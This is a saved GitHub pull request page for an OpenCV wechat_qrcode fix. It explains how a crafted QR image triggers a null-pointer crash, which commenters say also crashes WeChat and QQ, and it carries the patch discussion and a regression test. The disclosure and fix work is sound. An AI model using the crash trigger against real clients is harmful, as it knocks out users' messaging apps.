=== Content from github.com_c8f0e48f_20250115_092839.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopencv%2Fopencv_contrib%2Fpull%2F3480)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopencv%2Fopencv_contrib%2Fpull%2F3480)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=opencv%2Fopencv_contrib)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[opencv](/opencv)
/
**[opencv\_contrib](/opencv/opencv_contrib)**
Public

* [Notifications](/login?return_to=%2Fopencv%2Fopencv_contrib) You must be signed in to change notification settings
* [Fork
  5.8k](/login?return_to=%2Fopencv%2Fopencv_contrib)
* [Star
   9.5k](/login?return_to=%2Fopencv%2Fopencv_contrib)

* [Code](/opencv/opencv_contrib)
* [Issues
  526](/opencv/opencv_contrib/issues)
* [Pull requests
  82](/opencv/opencv_contrib/pulls)
* [Actions](/opencv/opencv_contrib/actions)
* [Security](/opencv/opencv_contrib/security)
* [Insights](/opencv/opencv_contrib/pulse)

Additional navigation options

* [Code](/opencv/opencv_contrib)
* [Issues](/opencv/opencv_contrib/issues)
* [Pull requests](/opencv/opencv_contrib/pulls)
* [Actions](/opencv/opencv_contrib/actions)
* [Security](/opencv/opencv_contrib/security)
* [Insights](/opencv/opencv_contrib/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fopencv%2Fopencv_contrib%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fopencv%2Fopencv_contrib%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# fix(wechat\_qrcode): Init nBytes after the count value is determined #3480

 Merged

[vpisarev](/vpisarev)
merged 6 commits into
[opencv:4.x](/opencv/opencv_contrib/tree/4.x "opencv/opencv_contrib:4.x")
from
[Konano:patch-1](/Konano/opencv_contrib/tree/patch-1 "Konano/opencv_contrib:patch-1")

Apr 26, 2023

 Merged

# [fix(wechat\_qrcode): Init nBytes after the count value is determined](#top) #3480

[vpisarev](/vpisarev)
merged 6 commits into
[opencv:4.x](/opencv/opencv_contrib/tree/4.x "opencv/opencv_contrib:4.x")
from
[Konano:patch-1](/Konano/opencv_contrib/tree/patch-1 "Konano/opencv_contrib:patch-1")

Apr 26, 2023

[Conversation
62](/opencv/opencv_contrib/pull/3480)
[Commits
6](/opencv/opencv_contrib/pull/3480/commits)
[Checks
0](/opencv/opencv_contrib/pull/3480/checks)
[Files changed](/opencv/opencv_contrib/pull/3480/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![Konano](https://avatars.githubusercontent.com/u/22500116?s=60&v=4)](/Konano)

Copy link

Contributor

### @Konano **[Konano](/Konano)** commented [Apr 24, 2023](#issue-1680522252) • edited by zihaomu Loading

Merge with test case: [opencv/opencv\_extra#1061](https://github.com/opencv/opencv_extra/pull/1061)

A malicious crafted image will crash the wechat\_qrcode module by invalid memory access.

The earliest PoC by [@GZTimeWalker](https://github.com/GZTimeWalker): <https://gist.github.com/GZTimeWalker/3ca70a8af2f5830711e9cccc73fb5270>

Sample image:

[![image](https://user-images.githubusercontent.com/22500116/233914887-82a632fc-bf6a-40ee-805d-3503ae3089f7.png)](https://user-images.githubusercontent.com/22500116/233914887-82a632fc-bf6a-40ee-805d-3503ae3089f7.png)

In `DecodedBitStreamParser::decodeByteSegment`, an attacker can add a byte segment with the Character Count Indicator of non-zero but empty content at the end of the data segment, where `available` is 0 and `count` is updated to 0, but `nBytes` remains non-zero.

[opencv\_contrib/modules/wechat\_qrcode/src/zxing/qrcode/decoder/decoded\_bit\_stream\_parser.cpp](https://github.com/opencv/opencv_contrib/blob/960b3f685f39c0602b8a0dd35973a82ee72b7e3c/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp#L193-L200)

Lines 193 to 200
in
[960b3f6](/opencv/opencv_contrib/commit/960b3f685f39c0602b8a0dd35973a82ee72b7e3c)

|  | int nBytes = count; |
| --- | --- |
|  | BitSource& bits(\*bits\_); |
|  | // Don't crash trying to read more bits than we have available. |
|  | int available = bits.available(); |
|  | // try to repair count data if count data is invalid |
|  | if (count \* 8 > available) { |
|  | count = (available + 7 / 8); |
|  | } |

Since `count` is 0, the `readBytes` in L203 is a null pointer.

[opencv\_contrib/modules/wechat\_qrcode/src/zxing/qrcode/decoder/decoded\_bit\_stream\_parser.cpp](https://github.com/opencv/opencv_contrib/blob/960b3f685f39c0602b8a0dd35973a82ee72b7e3c/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp#L202-L203)

Lines 202 to 203
in
[960b3f6](/opencv/opencv_contrib/commit/960b3f685f39c0602b8a0dd35973a82ee72b7e3c)

|  | ArrayRef<char> bytes\_(count); |
| --- | --- |
|  | char\* readBytes = &(\*bytes\_)[0]; |

Then `DecodedBitStreamParser::decodeByteSegment` will call `DecodedBitStreamParser::append`, where the `nBytes` parameter is not 0.

[opencv\_contrib/modules/wechat\_qrcode/src/zxing/qrcode/decoder/decoded\_bit\_stream\_parser.cpp](https://github.com/opencv/opencv_contrib/blob/960b3f685f39c0602b8a0dd35973a82ee72b7e3c/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp#L227)

Line 227
in
[960b3f6](/opencv/opencv_contrib/commit/960b3f685f39c0602b8a0dd35973a82ee72b7e3c)

|  | append(result, readBytes, nBytes, err\_handler); |
| --- | --- |

Eventually the program will crash at line 108 because it accesses a null pointer.

[opencv\_contrib/modules/wechat\_qrcode/src/zxing/qrcode/decoder/decoded\_bit\_stream\_parser.cpp](https://github.com/opencv/opencv_contrib/blob/960b3f685f39c0602b8a0dd35973a82ee72b7e3c/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp#L108)

Line 108
in
[960b3f6](/opencv/opencv_contrib/commit/960b3f685f39c0602b8a0dd35973a82ee72b7e3c)

|  | result.append((const char\*)bufIn, nIn); |
| --- | --- |

We think the essence of the issue is that `count` was modified without updating `nBytes`, resulting in inconsistent values for the two variables. Unlike [#3479](https://github.com/opencv/opencv_contrib/pull/3479), we think that the initialization of `nBytes` should be done after the value of `count` has been determined, which helps avoid other potential errors.

Moreover, we also found some wrong calculations in line 199, which are corrected together in this PR.

Also fixed [#3478](https://github.com/opencv/opencv_contrib/issues/3478).

### Pull Request Readiness Checklist

See details at <https://github.com/opencv/opencv/wiki/How_to_contribute#making-a-good-pull-request>

* I agree to contribute to the project under Apache 2 License.
* To the best of my knowledge, the proposed patch is not based on a code under GPL or another license that is incompatible with OpenCV
* The PR is proposed to the proper branch
* There is a reference to the original bug report and related work
* There is accuracy test, performance test and test data in opencv\_extra repository, if applicable

  Patch to opencv\_extra has the same branch name.
* The feature is well documented and sample code can be built with the project CMake

Sorry, something went wrong.

 👍
168
 ssst0n3, GZTimeWalker, Konano, ZenithalHourlyRate, BANKA2017, lynzrand, SunsetMkt, kxxt, jingfelix, rosuH, and 158 more reacted with thumbs up emoji
 🚀
5
 Baymax0, sixdog06, Tencnet777, acongee, and wangyunpeng98 reacted with rocket emoji
 👀
6
 DKisKD, escape0707, ho-229, lixin-wei, Baymax0, and zhdash reacted with eyes emoji

All reactions

* 👍
  168 reactions
* 🚀
  5 reactions
* 👀
  6 reactions

 [Konano](/Konano)
and others
added 3 commits
[April 24, 2023 14:04](#commits-pushed-4db1088)

[![@Konano](https://avatars.githubusercontent.com/u/22500116?s=40&v=4)](/Konano)

`[fix(wechat_qrcode): Initialize nBytes after the count value is determ…](/opencv/opencv_contrib/pull/3480/commits/4db108840a69e5ee2e948715ac8ae5fefe4c5d51 "fix(wechat_qrcode): Initialize nBytes after the count value is determined")`
 …

`[4db1088](/opencv/opencv_contrib/pull/3480/commits/4db108840a69e5ee2e948715ac8ae5fefe4c5d51)`

```
…ined
```

[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=40&v=4)](/GZTimeWalker)

`[fix(wechat_qrcode): Incorrect count data repair](/opencv/opencv_contrib/pull/3480/commits/197bd158064c3a9927983e0168158805b96b3b7c "fix(wechat_qrcode): Incorrect count data repair")`

`[197bd15](/opencv/opencv_contrib/pull/3480/commits/197bd158064c3a9927983e0168158805b96b3b7c)`

[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=40&v=4)](/GZTimeWalker)

`[chore: format expr](/opencv/opencv_contrib/pull/3480/commits/5781267ce3436d65c0f302443def2b2e7cb8ff8c "chore: format expr")`

`[5781267](/opencv/opencv_contrib/pull/3480/commits/5781267ce3436d65c0f302443def2b2e7cb8ff8c)`

[![@ssst0n3](https://avatars.githubusercontent.com/u/16935049?s=80&u=e6179f68a9fbe99f4fd2cbe80211efb0862769b4&v=4)](/ssst0n3)

Copy link

### **[ssst0n3](/ssst0n3)** commented [Apr 24, 2023](#issuecomment-1519495456)

| Amazing, too fast |
| --- |

 😄
18
 MaxZoneJoshua, iOSleep, ek1ng, itstartstosnow, escape0707, abserari, miamia0, jay-youngn, satgo1546, PoplarZhaoYang, and 8 more reacted with laugh emoji

All reactions

* 😄
  18 reactions

Sorry, something went wrong.

[![@k3lpi3b4nsh33](https://avatars.githubusercontent.com/u/118002757?s=80&u=e6b786ef2c346e0ce8df6ec618225d99216e6b27&v=4)](/k3lpi3b4nsh33)

Copy link

### **[k3lpi3b4nsh33](/k3lpi3b4nsh33)** commented [Apr 24, 2023](#issuecomment-1519504997)

| Orz!! |
| --- |

All reactions

Sorry, something went wrong.

[![@TUGOhost](https://avatars.githubusercontent.com/u/28786059?s=80&u=cb2b6f4051d311a0c67126216e21973ef4b06e15&v=4)](/TUGOhost)

Copy link

### **[TUGOhost](/TUGOhost)** commented [Apr 24, 2023](#issuecomment-1519508366)

| amazing |
| --- |

 👍
5
 Ch3nYe, syuy, SeeFlowerX, abserari, and zflovecoding reacted with thumbs up emoji

All reactions

* 👍
  5 reactions

Sorry, something went wrong.

[![@syuy](https://avatars.githubusercontent.com/u/34786338?s=80&u=2a852b6a1a0ca3d7fd3891827cb0737067cd781d&v=4)](/syuy)

Copy link

### **[syuy](/syuy)** commented [Apr 24, 2023](#issuecomment-1519509144)

| Cool! |
| --- |

All reactions

Sorry, something went wrong.

[![@Lakr233](https://avatars.githubusercontent.com/u/25259084?s=80&u=b430a4db552aefc368ff79254c1ae0132c8edaa8&v=4)](/Lakr233)

Copy link

### **[Lakr233](/Lakr233)** commented [Apr 24, 2023](#issuecomment-1519525216)

| LGTM |
| --- |

 ❤️
5
 Konano, zflovecoding, Lakr233, hweining, and strangeliu reacted with heart emoji

All reactions

* ❤️
  5 reactions

Sorry, something went wrong.

[![@helin0815](https://avatars.githubusercontent.com/u/53761824?s=80&u=2f3eb7795d98fa9530541c6cbb28de2897ee3995&v=4)](/helin0815)

Copy link

### **[helin0815](/helin0815)** commented [Apr 24, 2023](#issuecomment-1519545814)

| 太猛了哥 |
| --- |

 👍
2
 dukejob and TrinitialChan reacted with thumbs up emoji
 👎
19
 leoleoasd, NatsuGaOwatta, Konano, BilderLoong, Navimark, Erica-Iris, imxtx, zflovecoding, hang333, BI1LQV, and 9 more reacted with thumbs down emoji

All reactions

* 👍
  2 reactions
* 👎
  19 reactions

Sorry, something went wrong.

[![@KarKLi](https://avatars.githubusercontent.com/u/34907015?s=80&u=5fd793003f4de597ff68ed535f65a1d6c73c0e9e&v=4)](/KarKLi)

Copy link

### **[KarKLi](/KarKLi)** commented [Apr 24, 2023](#issuecomment-1519553411)

| amazing! |
| --- |

All reactions

Sorry, something went wrong.

[![@KongWeibin](https://avatars.githubusercontent.com/u/8340941?s=80&u=24279f4dec23a6f2917b126f6f2d91a8451aea35&v=4)](/KongWeibin)

Copy link

### **[KongWeibin](/KongWeibin)** commented [Apr 24, 2023](#issuecomment-1519558363)

| interesting |
| --- |

All reactions

Sorry, something went wrong.

[![@Timon-2022](https://avatars.githubusercontent.com/u/105454512?s=80&u=8d01fa02c0c8bbfe578d5db1c7f8f19c6ba983cd&v=4)](/Timon-2022)

Copy link

### **[Timon-2022](/Timon-2022)** commented [Apr 24, 2023](#issuecomment-1519585017)

| niuwa!!!!mobai dalao! |
| --- |

 👍
2
 dukejob and TrinitialChan reacted with thumbs up emoji
 👎
28
 leoleoasd, wasPrime, NatsuGaOwatta, zkeq, ssst0n3, Erica-Iris, yongyiduan, Fros1er, cnlinxi, Konano, and 18 more reacted with thumbs down emoji

All reactions

* 👍
  2 reactions
* 👎
  28 reactions

Sorry, something went wrong.

[![@Naville](https://avatars.githubusercontent.com/u/5205699?s=80&u=f3b971cab9b9911994d0662e8a37e45fcd7f0266&v=4)](/Naville)

Copy link

### **[Naville](/Naville)** commented [Apr 24, 2023](#issuecomment-1519594890) • edited Loading

| ChatGPT 3.5:  What's the bug in this code?  ``` int available = bits.available();      // try to repair count data if count data is invalid      if (count * 8 > available) {          count = (available + 7 / 8);      }       ArrayRef<char> bytes_(count);  ```  There is a bug in the line `count = (available + 7 / 8);`. The expression `7/8` will be evaluated as integer division, resulting in a value of 0. Therefore, `count` will always be set to > `available` rather than being adjusted to the correct number of bytes needed to store the count data. To fix the bug, the expression should be `count = (available + 7) / 8;`, which will correctly round up to the nearest integer number of bytes needed to store the count data. |
| --- |

 👍
46
 itstartstosnow, sunimp, huyp182, yujincheng08, Xuanwo, lxyntz, Aegeaner, kennethBo, sin-coder, inhzus, and 36 more reacted with thumbs up emoji
 😄
10
 Justontheway, mrh929, moremorefaito, yrom, Lakr233, AgFlore, SaltfishAmi, Sunbelife, jierwangCisco, and luych reacted with laugh emoji
 👀
16
 escape0707, KarKLi, carsonxw, Lyken17, flaneur2020, yankeguo, NatsuGaOwatta, satgo1546, Justontheway, houyu07, and 6 more reacted with eyes emoji

All reactions

* 👍
  46 reactions
* 😄
  10 reactions
* 👀
  16 reactions

Sorry, something went wrong.

[![@yilongli-tubi](https://avatars.githubusercontent.com/u/124650028?s=80&u=82fcf37fbe1d6d0208fb9ff5c8c94c2588c157bb&v=4)](/yilongli-tubi)

Copy link

### **[yilongli-tubi](/yilongli-tubi)** commented [Apr 24, 2023](#issuecomment-1519696482)

| Amazing! This bug seems to just crash my WeChat client program... |
| --- |

 👍
1
 GuanxingLu reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@yoghurt-lee](https://avatars.githubusercontent.com/u/22719919?s=80&u=2fc93df0e1bbda1f86d0513936f5abb43ef7317b&v=4)](/yoghurt-lee)

Copy link

### **[yoghurt-lee](/yoghurt-lee)** commented [Apr 24, 2023](#issuecomment-1519698282)

| amazing！ |
| --- |

All reactions

Sorry, something went wrong.

[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=40&v=4)](/GZTimeWalker)

`[fix(wechat_qrcode): Avoid null pointer exception](/opencv/opencv_contrib/pull/3480/commits/240689f38d3da70166cd1973419f309d197f7e12 "fix(wechat_qrcode): Avoid null pointer exception")`

`[240689f](/opencv/opencv_contrib/pull/3480/commits/240689f38d3da70166cd1973419f309d197f7e12)`

[![@Nagico](https://avatars.githubusercontent.com/u/25633151?s=80&u=5170d3e487f264d054d3fb810d3f5d744635ff3d&v=4)](/Nagico)

Copy link

### **[Nagico](/Nagico)** commented [Apr 24, 2023](#issuecomment-1519757097)

| ~~But today is not Thursday~~😂 |
| --- |

 😄
9
 hosch3n, cubercsl, GZTimeWalker, AimiP02, ChoKhoOu, BI1LQV, phlinsia, LifeCheckpoint, and eczn reacted with laugh emoji

All reactions

* 😄
  9 reactions

Sorry, something went wrong.

[![@opencv-alalek](https://avatars.githubusercontent.com/u/128253464?s=40&v=4)](/opencv-alalek)
[opencv-alalek](/opencv-alalek)
added
[bug](/opencv/opencv_contrib/labels/bug)
[category: wechat\_qrcode](/opencv/opencv_contrib/labels/category%3A%20wechat_qrcode)
labels
[Apr 24, 2023](#event-9079329533)

[![@DapengFeng](https://avatars.githubusercontent.com/u/18318646?s=80&u=f48d593ecf38beb51da1d2f05a4553b9d3439cc2&v=4)](/DapengFeng)

Copy link

### **[DapengFeng](/DapengFeng)** commented [Apr 24, 2023](#issuecomment-1519929460)

| LGTM |
| --- |

 ❤️
1
 Konano reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[![@sfc9982](https://avatars.githubusercontent.com/u/26681591?s=80&u=c55fdbeae9858b8b25192222f8c6130abbc5986e&v=4)](/sfc9982)

Copy link

### **[sfc9982](/sfc9982)** commented [Apr 24, 2023](#issuecomment-1519944455)

| Long live these volunteers! ❤️ |
| --- |

 ❤️
8
 Konano, KiNG-GH, mrh929, UPON-2021, pmczx, ruiwang213, GZTimeWalker, and sfc9982 reacted with heart emoji
 👀
1
 BI1LQV reacted with eyes emoji

All reactions

* ❤️
  8 reactions
* 👀
  1 reaction

Sorry, something went wrong.

[![@UPON-2021](https://avatars.githubusercontent.com/u/93699115?s=80&u=703196962ae344aa820a1081ac1b0f7ad5dec073&v=4)](/UPON-2021)

Copy link

### **[UPON-2021](/UPON-2021)** commented [Apr 24, 2023](#issuecomment-1519987470)

| amazing！ |
| --- |

All reactions

Sorry, something went wrong.

[![@Apple-QAQ](https://avatars.githubusercontent.com/u/88485487?s=80&u=9743524ad029e6b6c0ddbfcd49db48b4059db6d0&v=4)](/Apple-QAQ)

Copy link

### **[Apple-QAQ](/Apple-QAQ)** commented [Apr 24, 2023](#issuecomment-1520013102)

| Too Fast! |
| --- |

 👀
1
 MuTong233 reacted with eyes emoji

All reactions

* 👀
  1 reaction

Sorry, something went wrong.

[![@xieyumc](https://avatars.githubusercontent.com/u/47858007?s=80&u=4fd1500edd4a39d9cf6d46a3a58d49330c307a0c&v=4)](/xieyumc)

Copy link

### **[xieyumc](/xieyumc)** commented [Apr 24, 2023](#issuecomment-1520033112)

| QQ和微信都会crash |
| --- |

 👍
1
 xieyumc reacted with thumbs up emoji
 👎
1
 leoleoasd reacted with thumbs down emoji
 👀
2
 Konano and IA20201 reacted with eyes emoji

All reactions

* 👍
  1 reaction
* 👎
  1 reaction
* 👀
  2 reactions

Sorry, something went wrong.

[![@NoahZhang1](https://avatars.githubusercontent.com/u/41597923?s=80&u=d1cf20f0138ed3cb519b980700f88397a9849091&v=4)](/NoahZhang1)

Copy link

### **[NoahZhang1](/NoahZhang1)** commented [Apr 24, 2023](#issuecomment-1520118475)

| Cool!! Really fast |
| --- |

All reactions

Sorry, something went wrong.

[![mochaaP](https://avatars.githubusercontent.com/u/21154023?s=60&v=4)](/mochaaP)

**[mochaaP](/mochaaP)**
approved these changes
[Apr 24, 2023](#pullrequestreview-1397955250)

 [View reviewed changes](/opencv/opencv_contrib/pull/3480/files/240689f38d3da70166cd1973419f309d197f7e12)

Copy link

### @mochaaP **[mochaaP](/mochaaP)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

lgtm

Sorry, something went wrong.

 ❤️
4
 Konano, zflovecoding, WanliZhong, and local-h0st reacted with heart emoji

All reactions

* ❤️
  4 reactions

[![aisk](https://avatars.githubusercontent.com/u/699636?s=60&v=4)](/aisk)

**[aisk](/aisk)**
approved these changes
[Apr 24, 2023](#pullrequestreview-1397984936)

 [View reviewed changes](/opencv/opencv_contrib/pull/3480/files/240689f38d3da70166cd1973419f309d197f7e12)

[![@Konano](https://avatars.githubusercontent.com/u/22500116?s=80&u=e3d4a5f3e3fa026b0276cb58328fbd117ce35d19&v=4)](/Konano)

Copy link

Contributor

Author

### **[Konano](/Konano)** commented [Apr 24, 2023](#issuecomment-1520234439)

| [@opencv-alalek](https://github.com/opencv-alalek) [@asmorkalov](https://github.com/asmorkalov) Would it be possible to review and merge of my pull request? Thank you very much! |
| --- |

 👍
4
 Xuanwo, GZTimeWalker, qianxi0410, and CherryRum reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@HRan2004](https://avatars.githubusercontent.com/u/42177278?s=80&u=740af9067ce6132ba57dc5f3c0e037fb51a19667&v=4)](/HRan2004)

Copy link

### **[HRan2004](/HRan2004)** commented [Apr 24, 2023](#issuecomment-1520354963)

| 666 |
| --- |

 👎
5
 Konano, xieyumc, Naville, leoleoasd, and GZTimeWalker reacted with thumbs down emoji

All reactions

* 👎
  5 reactions

Sorry, something went wrong.

[![@RJHD-GIT](https://avatars.githubusercontent.com/u/58375039?s=80&u=ccdcade2623f3819f400808da7c0e875b3e0ab0d&v=4)](/RJHD-GIT)

Copy link

### **[RJHD-GIT](/RJHD-GIT)** commented [Apr 24, 2023](#issuecomment-1520397161)

| 有品 |
| --- |

 👎
4
 Konano, xieyumc, GZTimeWalker, and Naville reacted with thumbs down emoji

All reactions

* 👎
  4 reactions

Sorry, something went wrong.

17 hidden items

Load more…

[![@WanliZhong](https://avatars.githubusercontent.com/u/49567307?s=40&u=ba4399406177f757b46887f9bebc75e32e70a80f&v=4)](/WanliZhong)
[WanliZhong](/WanliZhong)
mentioned this pull request
[Apr 25, 2023](#ref-pullrequest-1682473712)

[Fix Wechat QRcode bug
#3481](/opencv/opencv_contrib/pull/3481)
 Closed

6 tasks

[![@JulianSong](https://avatars.githubusercontent.com/u/2277048?s=80&u=ef46c95bbab1e251cb8fbd0bfc91122d4a5cf2f7&v=4)](/JulianSong)

Copy link

### **[JulianSong](/JulianSong)** commented [Apr 25, 2023](#issuecomment-1521210117)

| LGTM |
| --- |

All reactions

Sorry, something went wrong.

[![WanliZhong](https://avatars.githubusercontent.com/u/49567307?s=60&v=4)](/WanliZhong)

**[WanliZhong](/WanliZhong)**
reviewed
[Apr 25, 2023](#pullrequestreview-1399218010)

 [View reviewed changes](/opencv/opencv_contrib/pull/3480/files/240689f38d3da70166cd1973419f309d197f7e12)

Copy link

Member

### @WanliZhong **[WanliZhong](/WanliZhong)** left a comment • edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

[@Konano](https://github.com/Konano) [@GZTimeWalker](https://github.com/GZTimeWalker) Hi, thanks for your contribution! Your patch will be the main branch to fix this bug. There are some comments:

1. put a test image to `opencv_extra/testdata/cv/qrcode/`
2. create a new pr to `opencv_extra` which branch name should be `patch-1` in `Konano`’s repository.
3. then update your code in `opencv_contrib`, the CI test will automatically pull the new test data to test your pr
4. add test code in `modules/wechat_qrcode/test/test_qrcode.cpp`
   ```
   TEST(Objdetect_QRCode_bug, issue_3478) {
       auto detector = wechat_qrcode::WeChatQRCode();
       std::string image_path = findDataFile("qrcode/issue_3478.png");
       Mat src = imread(image_path, IMREAD_GRAYSCALE);
       ASSERT_FALSE(src.empty()) << "Can't read image: " << image_path;
       std::vector<std::string> outs = detector.detectAndDecode(src);
       ASSERT_EQ(1, (int) outs.size());
       ASSERT_EQ(16, (int) outs[0].size());
       ASSERT_EQ("KFCVW50         ", outs[0]);
   }
   ```
5. after testing, your method does not pass the test sample on windows platform
6. I suggest you add code at Line 202
   ```
   // issue https://github.com/opencv/opencv_contrib/issues/3478
   if (bytes_->empty())
       return;
   ```

Sorry, something went wrong.

 👍
4
 zihaomu, Konano, GZTimeWalker, and Lakr233 reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=40&v=4)](/GZTimeWalker)

`[fix(wechat_qrcode): return when bytes_ is empty](/opencv/opencv_contrib/pull/3480/commits/2ea1d893c1089d9fc10b266627c4c6314fd6251a "fix(wechat_qrcode): return when bytes_ is empty")`

`[2ea1d89](/opencv/opencv_contrib/pull/3480/commits/2ea1d893c1089d9fc10b266627c4c6314fd6251a)`

[![@Konano](https://avatars.githubusercontent.com/u/22500116?s=80&u=e3d4a5f3e3fa026b0276cb58328fbd117ce35d19&v=4)](/Konano)

Copy link

Contributor

Author

### **[Konano](/Konano)** commented [Apr 25, 2023](#issuecomment-1521238080)

| [@WanliZhong](https://github.com/WanliZhong) Thank you for your help!  You mentioned that our method did not pass the test sample on windows platform, so I checked the test logs and the [error message](https://pullrequest.opencv.org/buildbot/builders/precommit-contrib_windows64/builds/100167/steps/test_wechat_qrcode/logs/tests%20summary) for test failure is as follows:  ``` unknown file: error: C++ exception with description "OpenCV(4.7.0-dev) C:\build\precommit-contrib_windows64\4.x\opencv\modules\ts\src\ts.cpp:1071: error: (-2:Unspecified error) OpenCV tests: Can't find required data file: qrcode/issue_3478.png in function 'cvtest::findData'  " thrown in the test body.  ```  It looks like the new test case is not loaded? |
| --- |

All reactions

Sorry, something went wrong.

[![@GZTimeWalker](https://avatars.githubusercontent.com/u/28180262?s=40&v=4)](/GZTimeWalker)

`[test(wechat_qrcode): add test case](/opencv/opencv_contrib/pull/3480/commits/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629 "test(wechat_qrcode): add test case")`

`[2c7ecf3](/opencv/opencv_contrib/pull/3480/commits/2c7ecf3ed844e7ad7ca2788ae20c16a660dd3629)`

[![@WanliZhong](https://avatars.githubusercontent.com/u/49567307?s=80&u=ba4399406177f757b46887f9bebc75e32e70a80f&v=4)](/WanliZhong)

Copy link

Member

### **[WanliZhong](/WanliZhong)** commented [Apr 25, 2023](#issuecomment-1521240041)

| [@WanliZhong](https://github.com/WanliZhong) Thank you for your help!  You mentioned that our method did not pass the test sample on windows platform, so I checked the test logs and the [error message](https://pullrequest.opencv.org/buildbot/builders/precommit-contrib_windows64/builds/100167/steps/test_wechat_qrcode/logs/tests%20summary) for test failure is as follows:  ``` unknown file: error: C++ exception with description "OpenCV(4.7.0-dev) C:\build\precommit-contrib_windows64\4.x\opencv\modules\ts\src\ts.cpp:1071: error: (-2:Unspecified error) OpenCV tests: Can't find required data file: qrcode/issue_3478.png in function 'cvtest::findData'  " thrown in the test body.  ```  It looks like the new test case is not loaded?  Before runing the test, you should add an env variable to refer the test data `OPENCV_TEST_DATA_PATH=path/to/opencv_extra/testdata` |
| --- |

All reactions

Sorry, something went wrong.

